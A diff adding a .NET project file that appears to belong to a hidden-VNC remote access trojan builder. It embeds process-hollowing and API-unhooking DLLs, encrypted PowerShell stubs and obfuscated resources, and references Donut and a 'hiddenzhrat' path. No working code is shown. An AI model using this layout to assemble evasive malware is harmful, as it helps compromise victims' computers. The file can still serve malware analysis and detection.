@@ -1,0 +1,75 @@
+<Project Sdk="Microsoft.NET.Sdk.WindowsDesktop">
+  <PropertyGroup>
+    <AssemblyName>BirdBrainmofo</AssemblyName>
+    <GenerateAssemblyInfo>False</GenerateAssemblyInfo>
+    <OutputType>WinExe</OutputType>
+    <UseWindowsForms>True</UseWindowsForms>
+    <TargetFramework>net472</TargetFramework>
+  </PropertyGroup>
+  <PropertyGroup>
+    <LangVersion>9.0</LangVersion>
+    <AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>app.ico</ApplicationIcon>
+    <RootNamespace>BirdBrainmofo</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|AnyCPU'">
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|AnyCPU'">
+    <WarningLevel>0</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Compile Remove="HVNC\Controls\HVNC\**" />
+    <Compile Remove="HVNC\StubUtils\Donut\Donut\**" />
+    <EmbeddedResource Remove="HVNC\Controls\HVNC\**" />
+    <EmbeddedResource Remove="HVNC\StubUtils\Donut\Donut\**" />
+    <None Remove="HVNC\Controls\HVNC\**" />
+    <None Remove="HVNC\StubUtils\Donut\Donut\**" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Remove="HVNC\Resources\AESStub.ps1" />
+    <None Remove="HVNC\Resources\apiunhooker.dll" />
+    <None Remove="HVNC\Resources\runpe.dll" />
+    <None Remove="HVNC\Resources\XORStub.ps1" />
+    <None Remove="qT8DjKpvRcBQxlwUc2.1V2OLwGeIEb6lyLCOW" />
+    <Compile Remove="Class2.cs" />
+    <Compile Remove="Class8.cs" />
+    <Compile Remove="HVNC.Resources.Stub.cs" />
+    <Compile Remove="HVNC\Resources\Stub.cs" />
+    <None Remove="HVNC.Resources.XORStub.ps1" />
+    <None Remove="HVNC.Resources.AESStub.ps1" />
+    <None Remove="HVNC.Resources.runpe.dll" />
+    <None Remove="VBLVIN15y3Mx68Qe8m.bXwSjvHVAiEcZOFDwT" />
+    <None Remove="HVNC.Resources.apiunhooker.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="HVNC\Resources\AESStub.ps1" />
+    <EmbeddedResource Include="HVNC\Resources\apiunhooker.dll" />
+    <EmbeddedResource Include="HVNC\Resources\runpe.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="HVNC\Resources\Stub.cs" />
+    <EmbeddedResource Include="HVNC\Resources\XORStub.ps1" />
+  </ItemGroup>
+  <ItemGroup>
+    <Reference Include="dnlib">
+      <HintPath>..\..\hiddenzhrat\jit\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Management" />
+    <Reference Include="IconExtractor">
+      <HintPath>..\Dumps\IconExtractor.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="PeNet">
+      <HintPath>..\PeNet.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+</Project>
